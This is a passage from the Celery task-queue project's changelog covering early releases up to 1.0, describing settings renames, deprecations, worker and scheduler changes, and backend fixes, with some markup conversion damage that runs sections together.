(:kbd:`Control-c`),   this means it tries to terminate as soon as possible.  * Caching of results now moved to the base backend classes, so no need   to implement this functionality in the base classes.  * Caches are now also limited in size, so their memory usage doesn't grow   out of control.      You can set the maximum number of results the cache     can hold using the :setting:`CELERY_MAX_CACHED_RESULTS` setting (the     default is five thousand results). In addition, you can re-fetch already     retrieved results using `backend.reload_task_result` +     `backend.reload_taskset_result` (that's for those who want to send     results incrementally).  * The worker now works on Windows again.      > **Warning** >          If you're using Celery with Django, you can't use `project.settings`         as the settings module name, but the following should work: ``\`console $ python manage.py celeryd --settings=settings

</div>

  - Execution: <span class="title-ref">.messaging.TaskPublisher.send\_task</span> now incorporates all the functionality apply\_async previously did.
    
    > Like converting countdowns to ETA, so <span class="title-ref">celery.execute.apply\_async</span> is now simply a convenient front-end to <span class="title-ref">celery.messaging.TaskPublisher.send\_task</span>, using the task classes default options.
    > 
    > Also <span class="title-ref">celery.execute.send\_task</span> has been introduced, which can apply tasks using just the task name (useful if the client doesn't have the destination task in its task registry).
    > 
    > Example:
    > 
    > > \>\>\> from celery.execute import send\_task \>\>\> result = send\_task('celery.ping', args=\[\], kwargs={}) \>\>\> result.get() 'pong'

  - \`camqadm\`: This is a new utility for command-line access to the AMQP API.
    
    > Excellent for deleting queues/bindings/exchanges, experimentation and testing:
    > 
    > ``` console
    > $ camqadm
    > 1> help
    > ```
    > 
    > Gives an interactive shell, type <span class="title-ref">help</span> for a list of commands.
    > 
    > When using Django, use the management command instead:
    > 
    > ``` console
    > $ python manage.py camqadm
    > 1> help
    > ```

  - Redis result backend: To conform to recent Redis API changes, the following settings has been deprecated:
    
    >   - <span class="title-ref">REDIS\_TIMEOUT</span>
    >   - <span class="title-ref">REDIS\_CONNECT\_RETRY</span>
    > 
    > These will emit a <span class="title-ref">DeprecationWarning</span> if used.
    > 
    > A <span class="title-ref">REDIS\_PASSWORD</span> setting has been added, so you can use the new simple authentication mechanism in Redis.

  - The redis result backend no longer calls <span class="title-ref">SAVE</span> when disconnecting, as this is apparently better handled by Redis itself.

  - If <span class="title-ref">settings.DEBUG</span> is on, the worker now warns about the possible memory leak it can result in.

  - The ETA scheduler now sleeps at most two seconds between iterations.

  - The ETA scheduler now deletes any revoked tasks it might encounter.
    
    > As revokes aren't yet persistent, this is done to make sure the task is revoked even though, for example, it's currently being hold because its ETA is a week into the future.

  - The <span class="title-ref">task\_id</span> argument is now respected even if the task is executed eagerly (either using apply, or `CELERY_ALWAYS_EAGER`).

  - The internal queues are now cleared if the connection is reset.

  - New magic keyword argument: <span class="title-ref">delivery\_info</span>.
    
    > Used by retry() to resend the task to its original destination using the same exchange/routing\_key.

  - Events: Fields wasn't passed by <span class="title-ref">.send()</span> (fixes the UUID key errors in celerymon)

  - Added <span class="title-ref">--schedule</span>/<span class="title-ref">-s</span> option to the worker, so it is possible to specify a custom schedule filename when using an embedded `celerybeat` server (the <span class="title-ref">-B</span>/<span class="title-ref">--beat</span>) option.

  - Better Python 2.4 compatibility. The test suite now passes.

  - task decorators: Now preserve docstring as <span class="title-ref">cls.\_\_doc\_\_</span>, (was previously copied to <span class="title-ref">cls.run.\_\_doc\_\_</span>)

  - The <span class="title-ref">testproj</span> directory has been renamed to <span class="title-ref">tests</span> and we're now using <span class="title-ref">nose</span> + <span class="title-ref">django-nose</span> for test discovery, and <span class="title-ref">unittest2</span> for test cases.

  - New pip requirements files available in `requirements`.

  - TaskPublisher: Declarations are now done once (per process).

  - Added <span class="title-ref">Task.delivery\_mode</span> and the `CELERY_DEFAULT_DELIVERY_MODE` setting.
    
    > These can be used to mark messages non-persistent (i.e., so they're lost if the broker is restarted).

  - Now have our own <span class="title-ref">ImproperlyConfigured</span> exception, instead of using the Django one.

  - Improvements to the Debian init-scripts: Shows an error if the program is not executable. Does not modify <span class="title-ref">CELERYD</span> when using django with virtualenv.

<div id="version-1.0.0">

1.0.0 `` ` ===== :release-date: 2010-02-10 04:00 p.m. CET :release-by: Ask Solem  .. _v100-incompatible:  Backward incompatible changes -----------------------------  * Celery doesn't support detaching anymore, so you have to use the tools   available on your platform, or something like :pypi:`supervisor` to make ``celeryd`/`celerybeat`/`celerymon``into background processes.      We've had too many problems with the worker daemonizing itself, so it was     decided it has to be removed. Example start-up scripts has been added to     the `extra/` directory:      * Debian, Ubuntu, (:command:`start-stop-daemon`)          `extra/debian/init.d/celeryd`         `extra/debian/init.d/celerybeat`      * macOS :command:`launchd`          `extra/mac/org.celeryq.celeryd.plist`         `extra/mac/org.celeryq.celerybeat.plist`         `extra/mac/org.celeryq.celerymon.plist`      * Supervisor (http://supervisord.org)          `extra/supervisord/supervisord.conf`      In addition to `--detach`, the following program arguments has been     removed: `--uid`, `--gid`, `--workdir`, `--chroot`, `--pidfile`,     `--umask`. All good daemonization tools should support equivalent     functionality, so don't worry.      Also the following configuration keys has been removed:     `CELERYD_PID_FILE`, `CELERYBEAT_PID_FILE`, `CELERYMON_PID_FILE`.  * Default worker loglevel is now `WARN`, to enable the previous log level   start the worker with `--loglevel=INFO`.  * Tasks are automatically registered.      This means you no longer have to register your tasks manually.     You don't have to change your old code right away, as it doesn't matter if     a task is registered twice.      If you don't want your task to be automatically registered you can set     the `abstract` attribute``\`python class MyTask(Task): abstract = True

</div>

> By using <span class="title-ref">abstract</span> only tasks subclassing this task will be automatically registered (this works like the Django ORM).
> 
> If you don't want subclasses to be registered either, you can set the <span class="title-ref">autoregister</span> attribute to <span class="title-ref">False</span>.
> 
> Incidentally, this change also fixes the problems with automatic name assignment and relative imports. So you also don't have to specify a task name anymore if you use relative imports.

  - You can no longer use regular functions as tasks.
    
    > This change was added because it makes the internals a lot more clean and simple. However, you can now turn functions into tasks by using the <span class="title-ref">@task</span> decorator:
    > 
    > ``` python
    > from celery.decorators import task
    > 
    > @task()
    > def add(x, y):
    >     return x + y
    > ```
    > 
    > <div class="seealso">
    > 
    > \[guide-tasks\](\#guide-tasks) for more information about the task decorators.
    > 
    > </div>

  - The periodic task system has been rewritten to a centralized solution.
    
    > This means the worker no longer schedules periodic tasks by default, but a new daemon has been introduced: <span class="title-ref">celerybeat</span>.
    > 
    > To launch the periodic task scheduler you have to run `celerybeat`:
    > 
    > ``` console
    > $ celerybeat
    > ```
    > 
    > Make sure this is running on one server only, if you run it twice, all periodic tasks will also be executed twice.
    > 
    > If you only have one worker server you can embed it into the worker like this:
    > 
    > ``` console
    > $ celeryd --beat # Embed celerybeat in celeryd.
    > ```

  - The supervisor has been removed.
    
    > This means the <span class="title-ref">-S</span> and <span class="title-ref">--supervised</span> options to <span class="title-ref">celeryd</span> is no longer supported. Please use something like <http://supervisord.org> instead.

  - <span class="title-ref">TaskSet.join</span> has been removed, use <span class="title-ref">TaskSetResult.join</span> instead.

  - The task status <span class="title-ref">"DONE"</span> has been renamed to <span class="title-ref">"SUCCESS"</span>.

  - <span class="title-ref">AsyncResult.is\_done</span> has been removed, use <span class="title-ref">AsyncResult.successful</span> instead.

  - The worker no longer stores errors if <span class="title-ref">Task.ignore\_result</span> is set, to revert to the previous behavior set `CELERY_STORE_ERRORS_EVEN_IF_IGNORED` to <span class="title-ref">True</span>.

  - The statistics functionality has been removed in favor of events, so the <span class="title-ref">-S</span> and --statistics\` switches has been removed.

  - The module <span class="title-ref">celery.task.strategy</span> has been removed.

  - <span class="title-ref">celery.discovery</span> has been removed, and it's `autodiscover` function is now in <span class="title-ref">celery.loaders.djangoapp</span>. Reason: Internal API.

  - The `CELERY_LOADER` environment variable now needs loader class name in addition to module name,
    
    > For example, where you previously had: <span class="title-ref">"celery.loaders.default"</span>, you now need <span class="title-ref">"celery.loaders.default.Loader"</span>, using the previous syntax will result in a <span class="title-ref">DeprecationWarning</span>.

  - Detecting the loader is now lazy, and so isn't done when importing <span class="title-ref">celery.loaders</span>.
    
    > To make this happen <span class="title-ref">celery.loaders.settings</span> has been renamed to <span class="title-ref">load\_settings</span> and is now a function returning the settings object. <span class="title-ref">celery.loaders.current\_loader</span> is now also a function, returning the current loader.
    > 
    > So:
    > 
    >     loader = current_loader
    > 
    > needs to be changed to:
    > 
    >     loader = current_loader()

<div id="v100-deprecations">

Deprecations `` ` ------------  * The following configuration variables has been renamed and will be   deprecated in v2.0:      * ``CELERYD\_DAEMON\_LOG\_FORMAT`->`CELERYD\_LOG\_FORMAT`*`CELERYD\_DAEMON\_LOG\_LEVEL`->`CELERYD\_LOG\_LEVEL`*`CELERY\_AMQP\_CONNECTION\_TIMEOUT`->`CELERY\_BROKER\_CONNECTION\_TIMEOUT`*`CELERY\_AMQP\_CONNECTION\_RETRY`->`CELERY\_BROKER\_CONNECTION\_RETRY`*`CELERY\_AMQP\_CONNECTION\_MAX\_RETRIES`->`CELERY\_BROKER\_CONNECTION\_MAX\_RETRIES`*`SEND\_CELERY\_TASK\_ERROR\_EMAILS`->`CELERY\_SEND\_TASK\_ERROR\_EMAILS``* The public API names in celery.conf has also changed to a consistent naming   scheme.  * We now support consuming from an arbitrary number of queues.      To do this we had to rename the configuration syntax. If you use any of     the custom AMQP routing options (queue/exchange/routing_key, etc.), you     should read the new FAQ entry: [faq-task-routing](#faq-task-routing).      The previous syntax is deprecated and scheduled for removal in v2.0.  * `TaskSet.run` has been renamed to `TaskSet.apply_async`.      `TaskSet.run` has now been deprecated, and is scheduled for     removal in v2.0.  .. v100-news:  News ----  * Rate limiting support (per task type, or globally).  * New periodic task system.  * Automatic registration.  * New cool task decorator syntax.  * worker: now sends events if enabled with the `-E` argument.      Excellent for monitoring tools, one is already in the making     (https://github.com/celery/celerymon).      Current events include: :event:`worker-heartbeat`,     task-[received/succeeded/failed/retried],     :event:`worker-online`, :event:`worker-offline`.  * You can now delete (revoke) tasks that's already been applied.  * You can now set the hostname the worker identifies as using the `--hostname`   argument.  * Cache backend now respects the :setting:`CELERY_TASK_RESULT_EXPIRES` setting.  * Message format has been standardized and now uses ISO-8601 format   for dates instead of datetime.  * worker now responds to the :sig:`SIGHUP` signal by restarting itself.  * Periodic tasks are now scheduled on the clock.      That is, `timedelta(hours=1)` means every hour at :00 minutes, not every     hour from the server starts. To revert to the previous behavior you     can set `PeriodicTask.relative = True`.  * Now supports passing execute options to a TaskSets list of args.      Example:``\`pycon \>\>\> ts = TaskSet(add, \[(\[2, 2\], {}, {'countdown': 1}), ... (\[4, 4\], {}, {'countdown': 2}), ... (\[8, 8\], {}, {'countdown': 3})\]) \>\>\> ts.run()

</div>

  - Got a 3x performance gain by setting the prefetch count to four times the concurrency, (from an average task round-trip of 0.1s to 0.03s\!).
    
    > A new setting has been added: `CELERYD_PREFETCH_MULTIPLIER`, which is set to <span class="title-ref">4</span> by default.

  - Improved support for webhook tasks.
    
    > <span class="title-ref">celery.task.rest</span> is now deprecated, replaced with the new and shiny <span class="title-ref">celery.task.http</span>. With more reflective names, sensible interface, and it's possible to override the methods used to perform HTTP requests.

  - The results of task sets are now cached by storing it in the result backend.

<div id="v100-changes">

Changes `` ` -------  * Now depends on :pypi:`carrot` >= 0.8.1  * New dependencies: :pypi:`billiard`, :pypi:`python-dateutil`,   :pypi:`django-picklefield`.  * No longer depends on python-daemon  * The `uuid` distribution is added as a dependency when running Python 2.4.  * Now remembers the previously detected loader by keeping it in   the :envvar:`CELERY_LOADER` environment variable.      This may help on windows where fork emulation is used.  * ETA no longer sends datetime objects, but uses ISO 8601 date format in a   string for better compatibility with other platforms.  * No longer sends error mails for retried tasks.  * Task can now override the backend used to store results.  * Refactored the ExecuteWrapper, `apply` and :setting:`CELERY_ALWAYS_EAGER`   now also executes the task callbacks and signals.  * Now using a proper scheduler for the tasks with an ETA.      This means waiting ETA tasks are sorted by time, so we don't have     to poll the whole list all the time.  * Now also imports modules listed in :setting:`CELERY_IMPORTS` when running   with django (as documented).  * Log level for stdout/stderr changed from INFO to ERROR  * ImportErrors are now properly propagated when auto-discovering tasks.  * You can now use `celery.messaging.establish_connection` to establish a   connection to the broker.  * When running as a separate service the periodic task scheduler does some   smart moves to not poll too regularly.      If you need faster poll times you can lower the value     of :setting:`CELERYBEAT_MAX_LOOP_INTERVAL`.  * You can now change periodic task intervals at runtime, by making   `run_every` a property, or subclassing `PeriodicTask.is_due`.  * The worker now supports control commands enabled through the use of a   broadcast queue, you can remotely revoke tasks or set the rate limit for   a task type. See :mod:`celery.task.control`.  * The services now sets informative process names (as shown in `ps`   listings) if the :pypi:`setproctitle` module is installed.  * `~@NotRegistered` now inherits from `KeyError`,   and `TaskRegistry.__getitem__`+`pop` raises `NotRegistered` instead  * You can set the loader via the :envvar:`CELERY_LOADER` environment variable.  * You can now set :setting:`CELERY_IGNORE_RESULT` to ignore task results by   default (if enabled, tasks doesn't save results or errors to the backend used).  * The worker now correctly handles malformed messages by throwing away and   acknowledging the message, instead of crashing.  .. _v100-bugs:  Bugs ----  * Fixed a race condition that could happen while storing task results in the   database.  .. _v100-documentation:  Documentation -------------  * Reference now split into two sections; API reference and internal module   reference.  .. _version-0.8.4:  0.8.4 ===== :release-date: 2010-02-05 01:52 p.m. CEST :release-by: Ask Solem  * Now emits a warning if the --detach argument is used.   --detach shouldn't be used anymore, as it has several not easily fixed   bugs related to it. Instead, use something like start-stop-daemon,   :pypi:`supervisor` or :command:`launchd` (macOS).   * Make sure logger class is process aware, even if running Python >= 2.6.   * Error emails are not sent anymore when the task is retried.  .. _version-0.8.3:  0.8.3 ===== :release-date: 2009-12-22 09:43 a.m. CEST :release-by: Ask Solem  * Fixed a possible race condition that could happen when storing/querying   task results using the database backend.  * Now has console script entry points in the :file:`setup.py` file, so tools like   :pypi:`zc.buildout` will correctly install the programs ``celeryd`and`celeryinit``.  .. _version-0.8.2:  0.8.2 ===== :release-date: 2009-11-20 03:40 p.m. CEST :release-by: Ask Solem  * QOS Prefetch count wasn't applied properly, as it was set for every message   received (which apparently behaves like, "receive one more"), instead of only   set when our wanted value changed.  .. _version-0.8.1:  0.8.1 ================================= :release-date: 2009-11-16 05:21 p.m. CEST :release-by: Ask Solem  .. _v081-very-important:  Very important note -------------------  This release (with carrot 0.8.0) enables AMQP QoS (quality of service), which means the workers will only receive as many messages as it can handle at a time. As with any release, you should test this version upgrade on your development servers before rolling it out to production!  .. _v081-important:  Important changes -----------------  * If you're using Python < 2.6 and you use the multiprocessing backport, then   multiprocessing version 2.6.2.1 is required.  * All AMQP_* settings has been renamed to BROKER_*, and in addition   AMQP_SERVER has been renamed to BROKER_HOST, so before where you had::          AMQP_SERVER = 'localhost'         AMQP_PORT = 5678         AMQP_USER = 'myuser'         AMQP_PASSWORD = 'mypassword'         AMQP_VHOST = 'celery'    You need to change that to::          BROKER_HOST = 'localhost'         BROKER_PORT = 5678         BROKER_USER = 'myuser'         BROKER_PASSWORD = 'mypassword'         BROKER_VHOST = 'celery'  * Custom carrot backends now need to include the backend class name, so before   where you had::          CARROT_BACKEND = 'mycustom.backend.module'    you need to change it to::          CARROT_BACKEND = 'mycustom.backend.module.Backend'    where `Backend` is the class name. This is probably `"Backend"`, as   that was the previously implied name.  * New version requirement for carrot: 0.8.0  .. _v081-changes:  Changes -------  * Incorporated the multiprocessing backport patch that fixes the   `processName` error.  * Ignore the result of PeriodicTask's by default.  * Added a Redis result store backend  * Allow :file:`/etc/default/celeryd` to define additional options   for the``celeryd`init-script.  * MongoDB periodic tasks issue when using different time than UTC fixed.  * Windows specific: Negate test for available`os.fork``(thanks :github_user:`miracle2k`).  * Now tried to handle broken PID files.  * Added a Django test runner to contrib that sets   `CELERY_ALWAYS_EAGER = True` for testing with the database backend.  * Added a :setting:`CELERY_CACHE_BACKEND` setting for using something other   than the Django-global cache backend.  * Use custom implementation of``functools.partial``for Python 2.4 support   (Probably still problems with running on 2.4, but it will eventually be   supported)  * Prepare exception to pickle when saving :state:`RETRY` status for all backends.  * SQLite no concurrency limit should only be effective if the database backend   is used.   .. _version-0.8.0:  0.8.0 ===== :release-date: 2009-09-22 03:06 p.m. CEST :release-by: Ask Solem  .. _v080-incompatible:  Backward incompatible changes -----------------------------  * Add traceback to result value on failure.      > **Note** >          If you use the database backend you have to re-create the         database table `celery_taskmeta`.          Contact the [mailing-list](#mailing-list) or [irc-channel](#irc-channel) channel         for help doing this.  * Database tables are now only created if the database backend is used,   so if you change back to the database backend at some point,   be sure to initialize tables (django: `syncdb`, python: `celeryinit`).    .. note::       This is only applies if using Django version 1.1 or higher.  * Now depends on `carrot` version 0.6.0.  * Now depends on python-daemon 1.4.8  .. _v080-important:  Important changes -----------------  * Celery can now be used in pure Python (outside of a Django project).      This means Celery is no longer Django specific.      For more information see the FAQ entry     [faq-is-celery-for-django-only](#faq-is-celery-for-django-only).  * Celery now supports task retries.      See [task-retry](#task-retry) for more information.  * We now have an AMQP result store backend.      It uses messages to publish task return value and status. And it's     incredibly fast!      See issue #6 for more info!  * AMQP QoS (prefetch count) implemented:      This to not receive more messages than we can handle.  * Now redirects stdout/stderr to the workers log file when detached  * Now uses `inspect.getargspec` to only pass default arguments     the task supports.  * Add Task.on_success, .on_retry, .on_failure handlers     See `celery.task.base.Task.on_success`,         `celery.task.base.Task.on_retry`,         `celery.task.base.Task.on_failure`,  * `celery.utils.gen_unique_id`: Workaround for     http://bugs.python.org/issue4607  * You can now customize what happens at worker start, at process init, etc.,     by creating your own loaders (see :mod:`celery.loaders.default`,     :mod:`celery.loaders.djangoapp`, :mod:`celery.loaders`).  * Support for multiple AMQP exchanges and queues.      This feature misses documentation and tests, so anyone interested     is encouraged to improve this situation.  * The worker now survives a restart of the AMQP server!    Automatically re-establish AMQP broker connection if it's lost.    New settings:      * AMQP_CONNECTION_RETRY         Set to `True` to enable connection retries.      * AMQP_CONNECTION_MAX_RETRIES.         Maximum number of restarts before we give up. Default: `100`.  .. _v080-news:  News ----  *  Fix an incompatibility between python-daemon and multiprocessing,     which resulted in the `[Errno 10] No child processes` problem when     detaching.  * Fixed a possible DjangoUnicodeDecodeError being raised when saving pickled     data to Django`s Memcached cache backend.  * Better Windows compatibility.  * New version of the pickled field (taken from     http://www.djangosnippets.org/snippets/513/)  * New signals introduced: `task_sent`, `task_prerun` and     `task_postrun`, see :mod:`celery.signals` for more information.  * `TaskSetResult.join` caused `TypeError` when `timeout=None`.     Thanks Jerzy Kozera. Closes #31  * `views.apply` should return `HttpResponse` instance.     Thanks to Jerzy Kozera. Closes #32  * `PeriodicTask`: Save conversion of `run_every` from `int`     to `timedelta` to the class attribute instead of on the instance.  * Exceptions has been moved to `celery.exceptions`, but are still     available in the previous module.  * Try to rollback transaction and retry saving result if an error happens     while setting task status with the database backend.  * jail() refactored into `celery.execute.ExecuteWrapper`.  * `views.apply` now correctly sets mime-type to "application/json"  * `views.task_status` now returns exception if state is :state:`RETRY`  * `views.task_status` now returns traceback if state is :state:`FAILURE`     or :state:`RETRY`  * Documented default task arguments.  * Add a sensible __repr__ to ExceptionInfo for easier debugging  * Fix documentation typo `.. import map` -> `.. import dmap`.     Thanks to :github_user:`mikedizon`.  .. _version-0.6.0:  0.6.0 ===== :release-date: 2009-08-07 06:54 a.m. CET :release-by: Ask Solem  .. _v060-important:  Important changes -----------------  * Fixed a bug where tasks raising unpickleable exceptions crashed pool     workers. So if you've had pool workers mysteriously disappearing, or     problems with the worker stopping working, this has been fixed in this     version.  * Fixed a race condition with periodic tasks.  * The task pool is now supervised, so if a pool worker crashes,     goes away or stops responding, it is automatically replaced with     a new one.  * Task.name is now automatically generated out of class module+name, for   example `"djangotwitter.tasks.UpdateStatusesTask"`. Very convenient.   No idea why we didn't do this before. Some documentation is updated to not   manually specify a task name.  .. _v060-news:  News ----  * Tested with Django 1.1  * New Tutorial: Creating a click counter using Carrot and Celery  * Database entries for periodic tasks are now created at the workers     start-up instead of for each check (which has been a forgotten TODO/XXX     in the code for a long time)  * New settings variable: :setting:`CELERY_TASK_RESULT_EXPIRES`     Time (in seconds, or a `datetime.timedelta` object) for when after     stored task results are deleted. For the moment this only works for the     database backend.  * The worker now emits a debug log message for which periodic tasks     has been launched.  * The periodic task table is now locked for reading while getting     periodic task status (MySQL only so far, seeking patches for other     engines)  * A lot more debugging information is now available by turning on the     `DEBUG` log level (`--loglevel=DEBUG`).  * Functions/methods with a timeout argument now works correctly.  * New: `celery.strategy.even_time_distribution`:     With an iterator yielding task args, kwargs tuples, evenly distribute     the processing of its tasks throughout the time window available.  * Log message `Unknown task ignored...` now has log level `ERROR`  * Log message when task is received is now emitted for all tasks, even if     the task has an ETA (estimated time of arrival). Also the log message now     includes the ETA for the task (if any).  * Acknowledgment now happens in the pool callback. Can't do ack in the job     target, as it's not pickleable (can't share AMQP connection, etc.).  * Added note about .delay hanging in README  * Tests now passing in Django 1.1  * Fixed discovery to make sure app is in INSTALLED_APPS  * Previously overridden pool behavior (process reap, wait until pool worker     available, etc.) is now handled by `multiprocessing.Pool` itself.  * Convert statistics data to Unicode for use as kwargs. Thanks Lucy!  .. _version-0.4.1:  0.4.1 ===== :release-date: 2009-07-02 01:42 p.m. CET :release-by: Ask Solem  * Fixed a bug with parsing the message options (`mandatory`,   `routing_key`, `priority`, `immediate`)  .. _version-0.4.0:  0.4.0 ===== :release-date: 2009-07-01 07:29 p.m. CET :release-by: Ask Solem  * Adds eager execution. `celery.execute.apply`|`Task.apply` executes the   function blocking until the task is done, for API compatibility it   returns a `celery.result.EagerResult` instance. You can configure   Celery to always run tasks locally by setting the   :setting:`CELERY_ALWAYS_EAGER` setting to `True`.  * Now depends on `anyjson`.  * 99% coverage using Python `coverage` 3.0.  .. _version-0.3.20:  0.3.20 ====== :release-date: 2009-06-25 08:42 p.m. CET :release-by: Ask Solem  * New arguments to `apply_async` (the advanced version of   `delay_task`), `countdown` and `eta`;      >>> # Run 10 seconds into the future.     >>> res = apply_async(MyTask, countdown=10);      >>> # Run 1 day from now     >>> res = apply_async(MyTask,     ...                   eta=datetime.now() + timedelta(days=1))  * Now unlinks stale PID files  * Lots of more tests.  * Now compatible with carrot >= 0.5.0.  * **IMPORTANT** The `subtask_ids` attribute on the `TaskSetResult`   instance has been removed. To get this information instead use:          >>> subtask_ids = [subtask.id for subtask in ts_res.subtasks]  * `Taskset.run()` now respects extra message options from the task class.  * Task: Add attribute `ignore_result`: Don't store the status and   return value. This means you can't use the   `celery.result.AsyncResult` to check if the task is   done, or get its return value. Only use if you need the performance   and is able live without these features. Any exceptions raised will   store the return value/status as usual.  * Task: Add attribute `disable_error_emails` to disable sending error   emails for that task.  * Should now work on Windows (although running in the background won't   work, so using the `--detach` argument results in an exception   being raised).  * Added support for statistics for profiling and monitoring.   To start sending statistics start the worker with the   `--statistics option. Then after a while you can dump the results   by running `python manage.py celerystats`. See   `celery.monitoring` for more information.  * The Celery daemon can now be supervised (i.e., it is automatically   restarted if it crashes). To use this start the worker with the   --supervised` option (or alternatively `-S`).  * views.apply: View calling a task.      Example:``\`text <http://e.com/celery/apply/task_name/arg1/arg2//?kwarg1=a&kwarg2=b>

</div>

> \> **Warning**

  - \>  
    Use with caution\! Don't expose this URL to the public without first ensuring that your code is safe\!

<!-- end list -->

  - Refactored <span class="title-ref">celery.task</span>. It's now split into three modules:
    
    >   - `celery.task`
    >     
    >     > Contains <span class="title-ref">apply\_async</span>, <span class="title-ref">delay\_task</span>, <span class="title-ref">discard\_all</span>, and task shortcuts, plus imports objects from <span class="title-ref">celery.task.base</span> and <span class="title-ref">celery.task.builtins</span>
    > 
    >   - `celery.task.base`
    >     
    >     > Contains task base classes: <span class="title-ref">Task</span>, <span class="title-ref">PeriodicTask</span>, <span class="title-ref">TaskSet</span>, <span class="title-ref">AsynchronousMapTask</span>, <span class="title-ref">ExecuteRemoteTask</span>.
    > 
    >   - `celery.task.builtins`
    >     
    >     > Built-in tasks: <span class="title-ref">PingTask</span>, <span class="title-ref">DeleteExpiredTaskMetaTask</span>.

<div id="version-0.3.7">

0.3.7 `` ` ===== :release-date: 2008-06-16 11:41 p.m. CET :release-by: Ask Solem  * **IMPORTANT** Now uses AMQP`s `basic.consume` instead of   `basic.get`. This means we're no longer polling the broker for   new messages.  * **IMPORTANT** Default concurrency limit is now set to the number of CPUs   available on the system.  * **IMPORTANT** `tasks.register`: Renamed `task_name` argument to   `name`, so::          >>> tasks.register(func, task_name='mytask')    has to be replaced with::          >>> tasks.register(func, name='mytask')  * The daemon now correctly runs if the pidfile is stale.  * Now compatible with carrot 0.4.5  * Default AMQP connection timeout is now 4 seconds. * `AsyncResult.read()` was always returning `True`.  *  Only use README as long_description if the file exists so easy_install    doesn't break.  * `celery.view`: JSON responses now properly set its mime-type.  * `apply_async` now has a `connection` keyword argument so you   can re-use the same AMQP connection if you want to execute   more than one task.  * Handle failures in task_status view such that it won't throw 500s.  * Fixed typo `AMQP_SERVER` in documentation to `AMQP_HOST`.  * Worker exception emails sent to administrators now works properly.  * No longer depends on `django`, so installing `celery` won't affect   the preferred Django version installed.  * Now works with PostgreSQL (:pypi:`psycopg2`) again by registering the   `PickledObject` field.  * Worker: Added `--detach` option as an alias to `--daemon`, and   it's the term used in the documentation from now on.  * Make sure the pool and periodic task worker thread is terminated   properly at exit (so :kbd:`Control-c` works again).  * Now depends on `python-daemon`.  * Removed dependency to `simplejson`  * Cache Backend: Re-establishes connection for every task process   if the Django cache backend is :pypi:`python-memcached`/:pypi:`libmemcached`.  * Tyrant Backend: Now re-establishes the connection for every task   executed.  .. _version-0.3.3:  0.3.3 ===== :release-date: 2009-06-08 01:07 p.m. CET :release-by: Ask Solem  * The `PeriodicWorkController` now sleeps for 1 second between checking   for periodic tasks to execute.  .. _version-0.3.2:  0.3.2 ===== :release-date: 2009-06-08 01:07 p.m. CET :release-by: Ask Solem  * worker: Added option `--discard`: Discard (delete!) all waiting   messages in the queue.  * Worker: The `--wakeup-after` option wasn't handled as a float.  .. _version-0.3.1:  0.3.1 ===== :release-date: 2009-06-08 01:07 p.m. CET :release-by: Ask Solem  * The `PeriodicTask` worker is now running in its own thread instead   of blocking the `TaskController` loop.  * Default `QUEUE_WAKEUP_AFTER` has been lowered to `0.1` (was `0.3`)  .. _version-0.3.0:  0.3.0 ===== :release-date: 2009-06-08 12:41 p.m. CET :release-by: Ask Solem  > **Warning** >      This is a development version, for the stable release, please     see versions 0.2.x.  **VERY IMPORTANT:** Pickle is now the encoder used for serializing task arguments, so be sure to flush your task queue before you upgrade.  * **IMPORTANT** TaskSet.run() now returns a ``celery.result.TaskSetResult``instance, which lets you inspect the status and return values of a   taskset as it was a single entity.  * **IMPORTANT** Celery now depends on carrot >= 0.4.1.  * The Celery daemon now sends task errors to the registered admin emails.   To turn off this feature, set `SEND_CELERY_TASK_ERROR_EMAILS` to   `False` in your `settings.py`. Thanks to Grégoire Cachet.  * You can now run the Celery daemon by using `manage.py`:``\`console $ python manage.py celeryd

</div>

> Thanks to Grégoire Cachet.

  - Added support for message priorities, topic exchanges, custom routing keys for tasks. This means we've introduced <span class="title-ref">celery.task.apply\_async</span>, a new way of executing tasks.
    
    You can use <span class="title-ref">celery.task.delay</span> and <span class="title-ref">celery.Task.delay</span> like usual, but if you want greater control over the message sent, you want <span class="title-ref">celery.task.apply\_async</span> and <span class="title-ref">celery.Task.apply\_async</span>.
    
    This also means the AMQP configuration has changed. Some settings has been renamed, while others are new:
    
    >   - `CELERY_AMQP_EXCHANGE`
    >   - `CELERY_AMQP_PUBLISHER_ROUTING_KEY`
    >   - `CELERY_AMQP_CONSUMER_ROUTING_KEY`
    >   - `CELERY_AMQP_CONSUMER_QUEUE`
    >   - `CELERY_AMQP_EXCHANGE_TYPE`
    
    See the entry \[faq-task-routing\](\#faq-task-routing) in the \[FAQ \<faq\>\](\#faq-\<faq\>) for more information.

  - Task errors are now logged using log level <span class="title-ref">ERROR</span> instead of <span class="title-ref">INFO</span>, and stack-traces are dumped. Thanks to Grégoire Cachet.

  - Make every new worker process re-establish it's Django DB connection, this solving the "MySQL connection died?" exceptions. Thanks to Vitaly Babiy and Jirka Vejrazka.

  - **IMPORTANT** Now using pickle to encode task arguments. This means you now can pass complex Python objects to tasks as arguments.

  - Removed dependency to <span class="title-ref">yadayada</span>.

  - Added a FAQ, see <span class="title-ref">docs/faq.rst</span>.

  - Now converts any Unicode keys in task <span class="title-ref">kwargs</span> to regular strings. Thanks Vitaly Babiy.

  - Renamed the <span class="title-ref">TaskDaemon</span> to <span class="title-ref">WorkController</span>.

  - <span class="title-ref">celery.datastructures.TaskProcessQueue</span> is now renamed to <span class="title-ref">celery.pool.TaskPool</span>.

  - The pool algorithm has been refactored for greater performance and stability.

<div id="version-0.2.0">

0.2.0 `` ` ===== :release-date: 2009-05-20 05:14 p.m. CET :release-by: Ask Solem  * Final release of 0.2.0  * Compatible with carrot version 0.4.0.  * Fixes some syntax errors related to fetching results   from the database backend.  .. _version-0.2.0-pre3:  0.2.0-pre3 ========== :release-date: 2009-05-20 05:14 p.m. CET :release-by: Ask Solem  * *Internal release*. Improved handling of unpickleable exceptions,   `get_result` now tries to recreate something looking like the   original exception.  .. _version-0.2.0-pre2:  0.2.0-pre2 ========== :release-date: 2009-05-20 01:56 p.m. CET :release-by: Ask Solem  * Now handles unpickleable exceptions (like the dynamically generated   subclasses of `django.core.exception.MultipleObjectsReturned`).  .. _version-0.2.0-pre1:  0.2.0-pre1 ========== :release-date: 2009-05-20 12:33 p.m. CET :release-by: Ask Solem  * It's getting quite stable, with a lot of new features, so bump   version to 0.2. This is a pre-release.  * `celery.task.mark_as_read()` and `celery.task.mark_as_failure()` has   been removed. Use `celery.backends.default_backend.mark_as_read()`,   and `celery.backends.default_backend.mark_as_failure()` instead.  .. _version-0.1.15:  0.1.15 ====== :release-date: 2009-05-19 04:13 p.m. CET :release-by: Ask Solem  * The Celery daemon was leaking AMQP connections, this should be fixed,   if you have any problems with too many files open (like `emfile`   errors in `rabbit.log`, please 